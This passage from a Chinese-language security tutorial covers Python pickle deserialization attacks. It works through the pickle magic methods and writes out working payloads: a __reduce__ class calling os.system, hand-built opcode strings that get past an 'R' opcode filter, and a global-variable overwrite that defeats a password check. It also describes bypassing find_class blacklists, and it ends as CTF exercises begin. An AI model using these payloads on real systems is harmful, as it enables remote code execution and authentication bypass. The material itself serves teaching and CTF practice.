class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>:<br>    attr = <span class="hljs-string">&#x27;A class attribute&#x27;</span><br><br>picklestring = pickle.dumps(Foo)<br></code></pre></td></tr></table></figure></li><li>当实例解封时，它的 <code>__init__()</code> 方法通常不会被调用。其默认动作是：先创建一个未初始化的实例，然后还原其属性：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">save</span>(<span class="hljs-params">obj</span>):<br>    <span class="hljs-keyword">return</span> (obj.__class__, obj.__dict__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">cls, attributes</span>):<br>    obj = cls.__new__(cls)<br>    obj.__dict__.update(attributes)<br>    <span class="hljs-keyword">return</span> obj<br></code></pre></td></tr></table></figure></li></ol><p>最后需要注意的是，由于 <code>0</code> 的存在，一个序列化字符串可以包含很多个不相关的操作，在后面会有一个例子来说明。</p><h2 id="攻击思路">攻击思路</h2><p>本来打算按照攻击场景来分类的，但是我发现场景太多了，还是按照构造方式分类，攻击手法作为附属示例会比较清晰。</p><p>payload 的构造分为用魔术方法自动构造和手动构造（手搓 opcode）。</p><h3 id="自动构造">自动构造</h3><p>首先，这样序列化肯定是达不到攻击目的的：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.a = os.system(<span class="hljs-string">&quot;whoami&quot;</span>)<br><br>test = Test()<br><br>serialized = pickle.dumps(test, protocol=<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(serialized)<br></code></pre></td></tr></table></figure></p><p><code>os.system("whoami")</code> 在 <code>test = Test()</code> 就会被执行完毕，所以这个可以说是自己日自己了。</p><h4 id="相关魔术方法">相关魔术方法</h4><p>上面提到过，解封的时候是有一个默认的赋值过程，既然是默认行为，往往是有办法自定义的。Python 提供了很多魔术方法（比如比较常见的 <code>__reduce__</code>），来改变这一默认行为。下面一起来看下这些魔术方法都是怎么用的（下面几个方法的介绍，内容大部分都是摘录自官方文档）。</p><h5 id="getnewargs_ex__">__getnewargs_ex__()</h5><p>限制：</p><ol type="1"><li>对于使用 v2 版或更高版协议的 pickle 才能使用此方法</li><li>必须返回一对 <code>(args, kwargs)</code> 用于构建对象，其中 <code>args</code> 是表示位置参数的 tuple，而 <code>kwargs</code> 是表示命名参数的 dict</li></ol><p><code>__getnewargs_ex__()</code> 方法 return 的值，会在解封时传给 <code>__new__()</code> 方法的作为它的参数。</p><h5 id="getnewargs__">__getnewargs__()</h5><p>限制：</p><ol type="1"><li>必须返回一个 tuple 类型的 <code>args</code></li><li>如果定义了 <code>__getnewargs_ex__()</code>，那么 <code>__getnewargs__()</code> 就不会被调用。</li></ol><p>这个方法与上一个 <code>__getnewargs_ex__()</code> 方法类似，但只支持位置参数。</p><p>注：在 Python 3.6 前，v2、v3 版协议会调用 <code>__getnewargs__()</code>，更高版本协议会调用 <code>__getnewargs_ex__()</code></p><h5 id="getstate__">__getstate__()</h5><p>类还可以进一步控制实例的封存过程。如果类定义了 <code>__getstate__()</code>，它就会被调用，其返回的对象是被当做实例内容来封存的，否则封存的是实例的 <code>__dict__</code>。如果 <code>__getstate__()</code> 未定义，实例的 <code>__dict__</code> 会被照常封存。</p><h5 id="setstate__">__setstate__()</h5><p>当解封时，如果类定义了 <code>__setstate__()</code>，就会在已解封状态下调用它。此时不要求实例的 state 对象必须是 dict。没有定义此方法的话，先前封存的 state 对象必须是 dict，且该 dict 内容会在解封时赋给新实例的 <code>__dict__</code></p><p>如果 <code>__getstate__()</code> 返回 <code>False</code>，那么在解封时就不会调用 <code>__setstate__()</code> 方法。</p><p>所以可以这么理解，pickle 时，Python 会封存该实例的 <code>__getstate__</code> 方法返回给它的值；unpickle 时，Python 将 unpickle 后的值作为参数传递给实例的 <code>_setstate_()</code> 方法。而在 <code>_setstate_()</code> 方法内部，是按照事先自定义好的流程来重建实例。</p><h5 id="reduce__">__reduce__()</h5><p>限制：</p><ol type="1"><li><code>__reduce__</code> 方法是新式类特有的</li></ol><p>opcode <code>R</code> 其实就是 <code>__reduce__()</code></p><p><code>__reduce__()</code> 方法不带任何参数，并且应返回字符串或最好返回一个元组（返回的对象通常称为 “reduce 值”）。</p><p>如果返回字符串，该字符串会被当做一个全局变量的名称。它应该是对象相对于其模块的本地名称，pickle 模块会搜索模块命名空间来确定对象所属的模块。这种行为常在单例模式使用。</p><p>如果返回的是元组，则应当包含 2 到 6 个元素，可选元素可以省略或设置为 None。每个元素代表的意义如下：</p><ol type="1"><li>一个可调用对象，该对象会在创建对象的最初版本时调用。</li><li>可调用对象的参数，是一个元组。如果可调用对象不接受参数，必须提供一个空元组。</li><li>可选元素，用于表示对象的状态，将被传给前述的 <code>__setstate__()</code> 方法。如果对象没有此方法，则这个元素必须是字典类型，并会被添加至 <code>__dict__</code> 属性中。</li><li>可选元素，一个返回连续项的迭代器（而不是序列）。这些项会被 <code>obj.append(item)</code> 逐个加入对象，或被 <code>obj.extend(list_of_items)</code> 批量加入对象。这个元素主要用于 list 的子类，也可以用于那些正确实现了 <code>append()</code> 和 <code>extend()</code> 方法的类。（具体是使用 <code>append()</code> 还是 <code>extend()</code> 取决于 pickle 协议版本以及待插入元素的项数，所以这两个方法必须同时被类支持）</li><li>可选元素，一个返回连续键值对的迭代器（而不是序列）。这些键值对将会以 <code>obj[key] = value</code> 的方式存储于对象中。该元素主要用于 dict 子类，也可以用于那些实现了 <code>__setitem__()</code> 的类。</li><li>可选元素，一个带有 <code>(obj, state)</code> 签名的可调用对象。该可调用对象允许用户以编程方式控制特定对象的状态更新行为，而不是使用 obj 的静态 <code>__setstate__()</code> 方法。如果此处不是 None，则此可调用对象的优先级高于 obj 的 <code>__setstate__()</code>。</li></ol><p>3.8 新版功能: 新增了元组的第 6 项，可选元素 <code>(obj, state)</code></p><p>可以看出，其实 pickle 并不直接调用上面的几个函数。事实上，它们实现了 <code>__reduce__()</code> 这一特殊方法。尽管这个方法功能很强，但是直接在类中实现 <code>__reduce__()</code> 容易产生错误。因此，设计类时应当尽可能的使用高级接口（比如 <code>__getnewargs_ex__()</code>、<code>__getstate__()</code> 和 <code>__setstate__()</code>）。后面仍然可以看到直接实现 <code>__reduce__()</code> 接口的状况，可能别无他法，可能为了获得更好的性能，或者两者皆有之。</p><h5 id="reduce_ex__">__reduce_ex__()</h5><p>作为替代选项，也可以实现 <code>__reduce_ex__()</code> 方法。此方法的唯一不同之处在于它接受一个整型参数用于指定协议版本。如果定义了这个函数，则会覆盖 <code>__reduce__()</code> 的行为。此外，<code>__reduce__()</code> 方法会自动成为扩展版方法的同义词。这个函数主要用于为以前的 Python 版本提供向后兼容的 reduce 值。</p><h4 id="利用-__reduce__-自动生成">利用 __reduce__() 自动生成</h4><p>这里举一个简单的执行命令的 demo。</p><p>显然，在上面那么多方法中，<code>__reduce__()</code> 是我们的首选构造方案，demo 如下：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&quot;whoami&quot;</span>, ))<br><br>test = Test()<br><br>serialized = pickle.dumps(test, protocol=<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(serialized)<br><br></code></pre></td></tr></table></figure></p><p>结果：<code>b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'</code></p><p>当然，新式类是 3.x 才有的。如果要在 2.x（&gt;= 2.2，&lt; 2.2 无新式类）使用 <code>__reduce__</code> 的话，需要手动显式继承新式类，把 <code>class Test</code> 改为 <code>class Test(object)</code> 即可。</p><p>如果攻击目标可以传入任意序列化结果，那么这个 payload 直接就可以生效。这种攻击最为简单，在 CTF 中，有利用黑名单 ban 掉 system 等等函数的题目，思路就是寻找黑名单的漏网之鱼。</p><h4 id="避免使用特定的-opcode">避免使用特定的 opcode</h4><p>如果攻击目标有对传入的序列化结果做高危 opcode 判断的话，可以尝试用不同版本的协议：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/6109c631-07fe-4d16-bfbb-c415ddfc91f1.png!blog#width-zoom6" /></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/34f6ae5c-5293-4716-aa50-dc1a016a2e89.png!blog#width-zoom6" /></p><p>这种差异性或许能让我们绕过一些 if 判断。不过，诸如 <code>R</code> 这种比较必需的 opcode，一般是很难用其他 opcode 来直接代替的。</p><h4 id="souse">souse</h4><p>为了方便构造 Payload，我写了一个自动转化的工具：<a href="https://github.com/Macr0phag3/souse">souse</a>，可以将 Python 源码形式的 exp 转为 opcode 形式的 exp，可冲！</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/help.png!blog#width-zoom6" /></p><p>不过，在用工具之前一定要先看下如何根据利用链手搓 opcode，毕竟工具只是工具而已。</p><p>网上也有另一个自动构造工具，见资料 4。</p><h3 id="手动构造">手动构造</h3><p>手动构造需要对 opcode 比较了解（实际上用几次就熟练了）。由于自动构造的手法手动构造都可以做到，所以为了避免内容重复，这里只列举手动构造特有攻击的手法。</p><h4 id="全局引用">全局引用</h4><p>举个例子：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        obj = pickle.loads(ser)  <span class="hljs-comment"># 输入点</span><br>        <span class="hljs-keyword">if</span> obj.pwd == secret.pwd:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello, admin!&quot;</span>)<br></code></pre></td></tr></table></figure></p><p>在这个例子中，假如我就是想通过这个 if 来完成攻击，应该怎么实现呢？</p><p>先看自动构造，比较直接的思路就是：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">secret</span>:<br>    pwd = <span class="hljs-string">&quot;???&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.pwd = secret.pwd<br><br>test = Target()<br><br>serialized = pickletools.optimize(pickle.dumps(test, protocol=<span class="hljs-number">0</span>))<br><span class="hljs-built_in">print</span>(serialized)<br><span class="hljs-comment"># 结果</span><br><span class="hljs-comment"># b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\nV???\nsb.&#x27;</span><br></code></pre></td></tr></table></figure></p><p>这个犯了和上面那个命令执行相同的错误，在实例化 Target 的时候，<code>self.pwd</code> 就已经被赋值完成了，而这肯定是有问题的，因为你不知道 <code>secret.pwd</code> 到底是啥（这里加个 <code>class secret</code> 只是为了代码可以运行）。</p><p>这个时候，我们可以利用 <code>c</code> 这个 opcode 来完成攻击。<code>c</code> 其实就是 <code>pickle.Unpickler().find_class(module, name)</code>。</p><p>它的作用是导入 module 模块并返回其中名叫 <code>name</code> 的对象，其中 module 和 name 参数都是 str 对象。文档指出，<code>find_class()</code> 同样可以用来导入函数。</p><p>既然如此，我们就可以把攻击目标类中引用的 <code>secret.pwd</code> 用 <code>c</code> 拿进来：<br /><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"># 前后对比<br>b&#x27;ccopy_reg<span class="hljs-symbol">\n</span>_reconstructor<span class="hljs-symbol">\n</span>(c__main__<span class="hljs-symbol">\n</span>Target<span class="hljs-symbol">\n</span>c__builtin__<span class="hljs-symbol">\n</span>object<span class="hljs-symbol">\n</span>NtR(dVpwd<span class="hljs-symbol">\n</span>V???<span class="hljs-symbol">\n</span>sb.&#x27;<br><br>b&#x27;ccopy_reg<span class="hljs-symbol">\n</span>_reconstructor<span class="hljs-symbol">\n</span>(c__main__<span class="hljs-symbol">\n</span>Target<span class="hljs-symbol">\n</span>c__builtin__<span class="hljs-symbol">\n</span>object<span class="hljs-symbol">\n</span>NtR(dVpwd<span class="hljs-symbol">\n</span>csecret<span class="hljs-symbol">\n</span>pwd<span class="hljs-symbol">\n</span>sb.&#x27;<br></code></pre></td></tr></table></figure></p><p>丢进去看看：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/c51474bf-c23b-4402-9773-bcda53d65405.png!blog#width-zoom8" /></p><p>nice</p><h4 id="引入魔术方法">引入魔术方法</h4><p>举个 RCE 的例子：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        ser = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># 输入点</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;R&quot;</span> <span class="hljs-keyword">in</span> ser:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hack! &lt;=@_@&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            obj = pickle.loads(ser)<br></code></pre></td></tr></table></figure></p><p>对于这个例子来说，要想 RCE，需要过这里的 if，也就是不能用 <code>R</code>。</p><p>先来看下常规的 payload 是什么样的：<br /><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cnt<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>(Vwhoami<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>tp2<span class="hljs-symbol">\n</span>Rp3<span class="hljs-symbol">\n</span>.<br>                                    ^<br></code></pre></td></tr></table></figure><br />这 R 如何去除呢？<code>b</code> 就派上用场了。</p><p>回顾一下它的作用：使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性/方法的设置。既然可以设置实例的方法，那么能不能设置一个方法让它在反序列化的时候自动运行呢？什么方法会在反序列化的时候自动运行，答案是上面提到的 <code>__setstate__()</code>。</p><p>所以，我们只需要令 <code>__setstate__ = os.system</code>，再把参数传入即可：<br /><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">ccopy_reg<span class="hljs-symbol">\n</span>_reconstructor<span class="hljs-symbol">\n</span>(c__main__<span class="hljs-symbol">\n</span>Target<span class="hljs-symbol">\n</span>c__builtin__<span class="hljs-symbol">\n</span>object<span class="hljs-symbol">\n</span>NtR(dV__setstate__<span class="hljs-symbol">\n</span>cos<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>ubVwhoami<span class="hljs-symbol">\n</span>b.<br></code></pre></td></tr></table></figure></p><p>但是我们把执行函数的那个 R 去掉之后，由于要构建实例，又引入了一个新的 R。用前面提到过的，修改协议版本即可：<br /><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">\x80\x02c__main__\nTest\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVwhoami\nb.</span><br><span class="hljs-comment"># pickletools.dis 如下</span><br>    <span class="hljs-attr">0:</span> <span class="hljs-string">c</span>    <span class="hljs-string">GLOBAL</span>     <span class="hljs-string">&#x27;__main__ Test&#x27;</span><br>   <span class="hljs-attr">15:</span> <span class="hljs-string">)</span>    <span class="hljs-string">EMPTY_TUPLE</span><br>   <span class="hljs-attr">16:</span> <span class="hljs-string">\x81</span> <span class="hljs-string">NEWOBJ</span><br>   <span class="hljs-attr">17:</span> <span class="hljs-string">&#125;</span>    <span class="hljs-string">EMPTY_DICT</span><br>   <span class="hljs-attr">18:</span> <span class="hljs-string">(</span>    <span class="hljs-string">MARK</span><br>   <span class="hljs-attr">19:</span> <span class="hljs-string">V</span>        <span class="hljs-string">UNICODE</span>    <span class="hljs-string">&#x27;__setstate__&#x27;</span><br>   <span class="hljs-attr">33:</span> <span class="hljs-string">c</span>        <span class="hljs-string">GLOBAL</span>     <span class="hljs-string">&#x27;os system&#x27;</span><br>   <span class="hljs-attr">44:</span> <span class="hljs-string">u</span>        <span class="hljs-string">SETITEMS</span>   <span class="hljs-string">(MARK</span> <span class="hljs-string">at</span> <span class="hljs-number">18</span><span class="hljs-string">)</span><br>   <span class="hljs-attr">45:</span> <span class="hljs-string">b</span>    <span class="hljs-string">BUILD</span><br>   <span class="hljs-attr">46:</span> <span class="hljs-string">V</span>    <span class="hljs-string">UNICODE</span>    <span class="hljs-string">&#x27;whoami&#x27;</span><br>   <span class="hljs-attr">54:</span> <span class="hljs-string">b</span>    <span class="hljs-string">BUILD</span><br>   <span class="hljs-attr">55:</span> <span class="hljs-string">.</span>    <span class="hljs-string">STOP</span><br></code></pre></td></tr></table></figure></p><p><code>\x80\x02</code> 是协议的版本声明，可写可不写，写错了也不影响 Python 识别；<code>\x81</code> 其实就是通过 <code>cls.__new__</code> 来创建一个实例，需要栈顶有 args（元组） 和 kwds（字典）。</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/6397d745-ca0b-48ed-a2ee-73b89b8766e5.png!blog#width-zoom8" /></p><h4 id="find_class-黑名单绕过">find_class 黑名单绕过</h4><p>Python 的官方文档里，明确表示了 pickle 是不保证安全性的，所以数据一定要可信才能进行 unpickle</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/bc66e3be-c891-4c13-ba24-a1db7cc29ecf.png!blog#width-zoom8" /></p><p>同时，也给出了安全使用 pickle 的最佳实践：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/a7951335-6080-420d-a558-544c50aa2f2d.png!blog#width-zoom8" /></p><p>当序列化中 opcode 出现 <code>c</code>、<code>i</code>、<code>b'\x93'</code> 时，会调用 find_class。利用白名单方法来限制解封的对象一般是没问题的。但是如果用黑名单，就容易出现疏漏，攻击的思路就是用 mro 来层层深入寻找黑名单以外的模块、方法，与我之前写的《Python 沙箱逃逸的经验总结》（见资料 1）里提到的技巧如出一辙，我这里就不啰嗦了。</p><p>如果你经常打 CTF，就会发现现在 Python 反序列化的题目基本上都要用到 find_class，后面会有一些经典的题目。作为题目难度控制器，需要和其他场景联合起来去看如何绕过，所以我这里就不单独举例说明了。</p><h4 id="变量与方法覆盖">变量与方法覆盖</h4><p>举个例子：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">PWD = <span class="hljs-string">&quot;???&quot;</span>  <span class="hljs-comment"># 已打码</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        obj = pickle.loads(ser)  <span class="hljs-comment"># 输入点</span><br>        <span class="hljs-keyword">if</span> obj.pwd == PWD:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello, admin!&quot;</span>)<br></code></pre></td></tr></table></figure></p><p>这个时候，可以通过 import <code>builtins</code> 来覆盖 <code>globals</code> 里的 <code>PWD</code>，转成代码就是这样：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><br>builtins.<span class="hljs-built_in">globals</span>()[<span class="hljs-string">&quot;PWD&quot;</span>] = <span class="hljs-string">&quot;tr0y&quot;</span>  <span class="hljs-comment"># 先把 PWD 改成一个值</span><br><br>obj.pwd = <span class="hljs-string">&quot;tr0y&quot;</span>  <span class="hljs-comment"># 再让 obj.pwd 也等于这个值</span><br></code></pre></td></tr></table></figure></p><p>转成 opcode 就是：<code>cbuiltins\nglobals\n(tR(VPWD\nVtr0y\nu.</code>，但是还有一个问题，此时 obj 实际上是字典，它并没有 pwd 这个属性，所以在 if 判断的时候就会直接报错。</p><p>解决的办法就是用 <code>0</code> 把栈里的 <code>builtins.globals()</code> 弹出，它已经完成了自己修改 PWD 值的使命；然后再压入一个 Target 实例，并让它的 pwd 属性等于 tr0y，这样就可以让 <code>obj.pwd</code> 的值与 PWD 一致：<br /><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cbuiltins<span class="hljs-symbol">\n</span>globals<span class="hljs-symbol">\n</span>(tR(VPWD<span class="hljs-symbol">\n</span>Vtr0y<span class="hljs-symbol">\n</span>u0c__main__<span class="hljs-symbol">\n</span>Target<span class="hljs-symbol">\n</span>)\x81&#125;(Vpwd<span class="hljs-symbol">\n</span>Vtr0y<span class="hljs-symbol">\n</span>ub.<br>                                      ^<br></code></pre></td></tr></table></figure></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/718dacd3-1f33-4952-ab51-94eb585e786c.png!blog#width-zoom8" /></p><p>这里你可能会想，<code>builtins.globals()</code> 是字典，而 Python 中一切皆对象，那么这个字典也是一个实例，这样岂不是也可以用 <code>b</code> 来给这个字典新增一个属性？这样 payload 就简洁得多：<br /><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cbuiltins<span class="hljs-symbol">\n</span>globals<span class="hljs-symbol">\n</span>(tR(VPWD<span class="hljs-symbol">\n</span>Vtr0y<span class="hljs-symbol">\n</span>u&#125;(Vpwd<span class="hljs-symbol">\n</span>Vtr0y<span class="hljs-symbol">\n</span>ub.<br></code></pre></td></tr></table></figure><br />遗憾的是，前面提到过，<code>b</code> 是执行 <code>__dict__.update()</code>，而字典是没有 <code>__dict__</code> 这个属性的，所以没法通过 b 给它新增一个属性：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/4ba4c6a5-8e35-46df-8f21-f418b2661b8c.png!blog#width-zoom8" /></p><p>当然，不仅变量可以被覆盖，方法也是可以被覆盖的。比如 <code>sys.modules.get("os")</code>，可以先用代码理清楚链路：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>p0 = sys.modules<br>p0[<span class="hljs-string">&quot;sys&quot;</span>] = p0<br><span class="hljs-keyword">import</span> sys<br>p0[<span class="hljs-string">&quot;sys&quot;</span>] = sys.get(<span class="hljs-string">&quot;os&quot;</span>)<br></code></pre></td></tr></table></figure></p><p>转成 opcode：<br /><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">csys<span class="hljs-symbol">\n</span>modules<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>0g0<span class="hljs-symbol">\n</span>Vsys<span class="hljs-symbol">\n</span>g0<span class="hljs-symbol">\n</span>scsys<span class="hljs-symbol">\n</span>get<span class="hljs-symbol">\n</span>(Vos<span class="hljs-symbol">\n</span>tR.<br></code></pre></td></tr></table></figure></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/fe49557c-a78c-4dd7-a61e-3b29ba0ca6f0.png!blog#width-zoom6" /></p><p>注意这里的 import 了两次，只有第一次是真正执行了 sys 模块，然后载入内存，第二次是从 sys.modules 直接引入的。这个特性与 Python import 协议有关系，它由两个模块构成，查找器和加载器。导入详细机制可看资料 5。</p><p>所以，这个思路要求对 Python 内置的一些属性、方法、模块有扎实的掌握。比如按照 Python 文档的意思来看，属性包括 <code>数据属性</code> 和 <code>方法</code>，所以严格来说，我们常说的<code>属性</code>一词，其实特指 <code>数据属性</code>（这一点没必要太纠结，反正大家都是这么说的）。还有，大家可能习惯性用 <code>dir()</code> 来查看属性和方法，其实它在参数不同的时候，查询的逻辑是不一样的：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/98a6e69c-927e-4960-ae87-e92636533d13.png!blog#width-zoom6" /></p><p>我一般是在 ipython 中用 <code>.*?</code> 来查看，例如 <code>os.*?</code>，这个结果是非常全的。</p><p>另外特别注意的是，有些对象的 <code>__dict__</code> 属于 <code>mappingproxy</code> 类型，例如：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/37e7cf49-b026-40ee-990b-1f670522f221.png!blog#width-zoom3" /></p><p>如果直接用 <code>b</code> 这种对象进行属性修改的话，会抛出异常：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/7b7667a1-0feb-469e-b0b5-e83d084cfa38.png!blog#width-zoom6" /></p><p>查看 pickle 的源码（见资料 6）可知（注：pickle 源码中有 <code>_pickle</code>（即 cPickle）优先使用的逻辑，如果这个模块导入失败，才会使用这上面的 pickle。这两个模块的逻辑略有差异，如果想仔细对比需要看下 <code>_pickle</code> 的 C 源码），最终会执行 <code>inst_dict[intern(k)] = v</code>，而 mappingproxy 类型禁止这样操作：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/b657bcaf-d4ba-4e2a-a317-06cd0002cf17.png!blog#width-zoom6" /></p><p>那么应该怎么办呢？再看源码，如果 <code>state</code> 是两个元素的元组，那么会执行 <code>state, slotstate = state</code>，如果此时 <code>state in [None, &#123;&#125;]</code>（由于 <code>_pickle</code> 逻辑问题，是没办法让 state 等于 <code>''</code>、<code>0</code> 等这种值的），那么就会跑去执行 <code>setattr(inst, k, v)</code>，这是 mappingproxy 类型允许的：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/ee98ebcb-fb16-4fc0-9436-d18b86626b6c.png!blog#width-zoom3" /></p><p>所以，假如有一个库是 A，里面有个类 b，要修改 b 的属性，原本要执行的 <code>cA\nb\n&#125;Va\nI1\nsb.</code> 应该改为 <code>cA\nb\n(N&#125;Va\nI1\ntsb.</code> 或者 <code>cA\nb\n(&#125;&#125;Va\nI1\ntsb.</code></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/3d00a59a-bb3c-4c71-93ee-e7eb1a7719c8.png!blog#width-zoom6" /></p><h2 id="课后题">课后题</h2><p>这三道题目是 2019 年的 BalsnCTF，非常经典的 Python 反序列化题，源码见资料 7</p><h3 id="pyshv1">pyshv1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 